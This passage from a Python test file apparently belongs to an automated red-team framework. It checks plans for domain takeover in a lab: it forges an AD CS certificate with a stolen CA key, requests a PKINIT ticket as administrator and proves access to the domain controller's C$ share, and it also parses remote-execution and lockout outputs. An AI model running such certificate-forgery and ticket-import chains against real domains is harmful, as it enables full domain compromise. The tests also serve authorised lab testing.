        "ca_pfx_path": r"C:\Windows\Temp\ca.pfx",
        "proof_host": "dc01.lab.local",
    })

    assert missing.ok is False
    assert missing.missing == ["ca_pfx_path"]
    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "kerberos-ticket-list",
        "kerberos-context-service-proof",
        "adcs-certificate-forge",
        "certificate-pkinit-tgt",
        "kerberos-logon-session-create",
        "kerberos-ticket-import",
        "kerberos-ticket-list",
        "kerberos-context-service-proof",
    ]
    forge = plan.steps[2]
    assert forge.parameters["ca_pfx_path"] == r"C:\Windows\Temp\ca.pfx"
    assert forge.parameters["subject_alt_name"] == "administrator@lab.local"
    assert forge.parameters["certificate_profile"] == "windows-pkinit-smartcard-logon"
    assert forge.parameters["crl_distribution_points"] == ["ldap:///"]
    assert forge.parameters["include_authority_key_identifier"] is True
    assert forge.parameters["include_subject_key_identifier"] is True
    assert forge.parameters["include_basic_constraints"] is True
    pkinit = plan.steps[3]
    assert pkinit.parameters["certificate_path"] == r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx"
    assert pkinit.parameters["getcredentials"] is True
    assert "dc" not in pkinit.parameters
    assert plan.steps[5].parameters["ticket_artifact"] == "{{kerberos_ticket_base64}}"
    proof = plan.steps[-1]
    assert proof.expected_probe == "extract_adcs_certificate_auth_probe"
    assert proof.parameters["resource"] == r"\\dc01.lab.local\C$"
    assert "ticket:kerberos_ticket_imported" in proof.prerequisites
    _assert_payload_agnostic_plan(plan)


def test_build_adcs_certificate_auth_plan_can_use_pre_forged_certificate():
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
        preconditions=["adcs-ca-private-key:ca01@lab.local", "live-callback:13"],
        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "13",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "certificate_already_forged": True,
        "forged_pfx_path": r"C:\Windows\Temp\admin.pfx",
        "forged_pfx_password": "CertSecret!",
        "proof_host": "dc01.lab.local",
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "kerberos-ticket-list",
        "kerberos-context-service-proof",
        "certificate-pkinit-tgt",
        "kerberos-logon-session-create",
        "kerberos-ticket-import",
        "kerberos-ticket-list",
        "kerberos-context-service-proof",
    ]
    assert plan.steps[2].parameters["certificate_path"] == r"C:\Windows\Temp\admin.pfx"
    assert plan.steps[2].prerequisites == ["artifact:pre_forged_certificate_pfx"]
    _assert_payload_agnostic_plan(plan)


def test_build_adcs_certificate_auth_plan_can_use_schannel_ldap_certificate():
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
        preconditions=["adcs-ca-private-key:ca01@lab.local", "live-callback:13"],
        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "13",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "certificate_auth_method": "schannel-ldap",
        "certificate_already_forged": True,
        "forged_pfx_path": r"C:\Windows\Temp\admin.pfx",
        "forged_pfx_password": "CertSecret!",
        "proof_host": "dc01.lab.local",
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == ["certificate-schannel-ldap-proof"]
    proof = plan.steps[0]
    assert proof.expected_probe == "extract_adcs_certificate_auth_probe"
    assert proof.parameters["certificate_path"] == r"C:\Windows\Temp\admin.pfx"
    assert proof.parameters["domain_controller"] == "dc01.lab.local"
    assert proof.parameters["search_base"] == "DC=lab,DC=local"
    assert proof.prerequisites == ["artifact:pre_forged_certificate_pfx"]
    _assert_payload_agnostic_plan(plan)


def test_adcs_certificate_auth_probe_requires_service_proof():
    partial_output = "\n".join([
        "ForgeCert",
        "CERT_FORGE_STATUS=OK",
        "[*] Action: Ask TGT",
        "[*] base64(ticket.kirbi):",
        "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==",
    ])
    achieved_output = "\n".join([
        "[*] Action: Ask TGT",
        "[*] base64(ticket.kirbi):",
        "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==",
        "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
        " Directory of \\\\dc01.lab.local\\C$",
        "Windows",
    ])

    partial = capabilities.extract_adcs_certificate_auth_probe(partial_output, "administrator", "lab.local")
    partial["callback_id"] = "13"
    achieved = capabilities.extract_adcs_certificate_auth_probe(
        achieved_output,
        "administrator",
        "lab.local",
        "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
    )
    achieved["callback_id"] = "13"

    assert capabilities.verify_capability("adcs-certificate-auth", partial).verdict == "partial"
    verdict = capabilities.verify_capability("adcs-certificate-auth", achieved)
    assert verdict.verdict == "achieved"
    assert achieved["certificate_auth_proven"] is True


def test_adcs_certificate_auth_probe_accepts_schannel_ldap_domain_admin_proof():
    output = "\n".join([
        "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
        "CERT_AUTH_METHOD=schannel-ldap",
        "CERT_AUTH_DOMAIN=lab.local",
        "CERT_AUTH_ACCOUNT=administrator",
        "CERT_AUTH_LDAP_BIND=True",
        "CERT_AUTH_USER_DN=CN=Administrator,CN=Users,DC=lab,DC=local",
        "CERT_AUTH_MEMBER_OF=CN=Domain Admins,CN=Users,DC=lab,DC=local",
        "CERT_AUTH_STATUS=OK",
    ])

    probe = capabilities.extract_adcs_certificate_auth_probe(
        output,
        "administrator",
        "lab.local",
        "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
    )
    probe["callback_id"] = "13"
    verdict = capabilities.verify_capability("adcs-certificate-auth", probe)

    assert verdict.verdict == "achieved"
    assert probe["schannel_ldap_bind"] is True
    assert probe["domain_admin"] is True
    assert probe["certificate_auth_proven"] is True


def test_adcs_certificate_auth_probe_classifies_pkinit_not_supported():
    output = "\n".join([
        "[*] Action: Ask TGT",
        "[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP",
    ])

    probe = capabilities.extract_adcs_certificate_auth_probe(output, "administrator", "lab.local")
    probe["callback_id"] = "13"
    verdict = capabilities.verify_capability("adcs-certificate-auth", probe)

    assert probe["pkinit_tgt_present"] is False
    assert probe["pkinit_not_supported"] is True
    assert verdict.verdict == "blocked"
    assert verdict.reason == "pkinit not supported"


def test_remote_execution_probe_requires_target_side_marker():
    success = "\n".join([
        "SAGE_REMOTE_EXEC_PROOF_ws01_13",
        "ws01\\administrator",
        "WS01",
    ])
    denied = "Access is denied."

    probe = capabilities.extract_remote_execution_probe(
        success,
        "ws01",
        "child.lab.local",
        "SAGE_REMOTE_EXEC_PROOF_ws01_13",
    )
    achieved = capabilities.verify_capability("execute-as-local-admin", {
        **probe,
        "callback_id": "13",
    })
    blocked = capabilities.verify_capability("execute-as-local-admin", {
        **capabilities.extract_remote_execution_probe(denied, "ws01", "child.lab.local", "SAGE_REMOTE_EXEC_PROOF_ws01_13"),
        "callback_id": "13",
    })

    assert achieved.verdict == "achieved"
    assert achieved.evidence["remote_execution_proven"] is True
    assert blocked.verdict == "blocked"


def test_remote_execution_probe_accepts_bytes_literal_with_opsec_suffix():
    output = (
        "b'SAGE_REMOTE_EXEC_PROOF_braavos_2  \\r\\n"
        "braavos\\\\administrator\\r\\nbraavos\\r\\n'\n\n"
        "[SAGE OPSEC] footprint total=3"
    )

    probe = capabilities.extract_remote_execution_probe(
        output,
        "braavos",
        "essos.local",
        "SAGE_REMOTE_EXEC_PROOF_braavos_2",
    )
    achieved = capabilities.verify_capability("execute-as-local-admin", {
        **probe,
        "callback_id": "2",
    })

    assert probe["proof_marker_line_seen"] is True
    assert probe["remote_identity_seen"] is True
    assert probe["remote_execution_proven"] is True
    assert achieved.verdict == "achieved"


def test_remote_execution_probe_classifies_account_lockout():
    output = "System error 1909 has occurred.\nThe referenced account is currently locked out and may not be logged on to."

    probe = capabilities.extract_remote_execution_probe(
        output,
        "ws01",
        "child.lab.local",
        "SAGE_REMOTE_EXEC_PROOF_ws01_13",
    )
    result = capabilities.verify_capability("execute-as-local-admin", {
        **probe,
        "callback_id": "13",
    })

    assert probe["account_locked"] is True
    assert result.verdict == "blocked"
    assert result.reason == "account locked"


def test_remote_execution_probe_rejects_marker_only_in_command_line():
    output = (
        "powershell.exe -Command \"$cmd='cmd.exe /c echo "
        "SAGE_REMOTE_EXEC_PROOF_ws01_13 > C:\\Windows\\Temp\\proof.txt';"
        "New-PSDrive -Root '\\\\ws01\\C$'\""
    )

    probe = capabilities.extract_remote_execution_probe(
        output,
        "ws01",
        "child.lab.local",
        "SAGE_REMOTE_EXEC_PROOF_ws01_13",
    )
    result = capabilities.verify_capability("execute-as-local-admin", {
        **probe,
        "callback_id": "13",
    })

    assert probe["proof_marker_seen"] is True
    assert probe["proof_marker_line_seen"] is False
    assert probe["remote_execution_proven"] is False
    assert result.verdict != "achieved"


def test_local_admin_access_probe_accepts_native_ls_json():
    output = (
        '{"host":"WS01.CHILD.LAB.LOCAL","name":"C$","success":true,'
        '"files":[{"directory":"C$","full_name":"C$\\\\Windows","name":"Windows"}]}'
    )

    probe = capabilities.extract_local_admin_access_probe(output, "ws01", "child.lab.local")
    achieved = capabilities.verify_capability("use-managed-local-admin-secret", {
        **probe,
        "callback_id": "13",
    })

    assert probe["target_resource_seen"] is True
    assert probe["admin_share_access_proven"] is True
    assert achieved.verdict == "achieved"
